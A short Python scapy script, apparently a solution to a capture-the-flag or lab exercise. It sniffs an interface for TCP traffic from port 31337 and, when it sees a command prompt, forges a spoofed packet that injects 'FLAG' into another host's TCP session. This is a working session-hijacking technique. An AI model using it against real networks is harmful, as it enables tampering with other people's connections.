from scapy.all import Ether, IP, TCP, Raw, sendp, sniff
import sys

# Define a callback function to handle sniffed packets.
def packet_callback(packet):
    if TCP not in packet:
       return
    
    if packet[TCP].sport == 31337:
        print(packet)
        #    print(" seq: " + str (packet[TCP].seq))
        #    print(" ack: " + str (packet[TCP].ack))

        if Raw in packet:
            payload = packet[Raw].load.decode()
            print(" " + repr(payload))

            if payload == "COMMANDS:\nECHO\nFLAG\nCOMMAND:\n":
                # Craft the response packet.
                ether_frame = Ether(src = packet[Ether].dst, dst = packet[Ether].src)
                ip_packet = IP(src = packet[IP].dst, dst = packet[IP].src)
                tcp_segment = TCP(sport = packet[TCP].dport, dport = packet[TCP].sport, seq = packet[TCP].ack, ack = packet[TCP].seq + len(payload), flags = "PA")
                my_payload = b"FLAG\n"
            
                # Encapsulate the different layers.
                response_packet = ether_frame / ip_packet / tcp_segment / my_payload
            
                # Send the packet.
                sendp(response_packet, iface = interface)

if __name__ == "__main__":

    if len(sys.argv) < 2:
        print(f"\nYou need to privide the interface name.")
        print(f"Aborting ...\n")
        exit(1)

    interface = sys.argv[1]
    sniff(prn = packet_callback, iface = interface, filter = "", store = 0, timeout = 300)
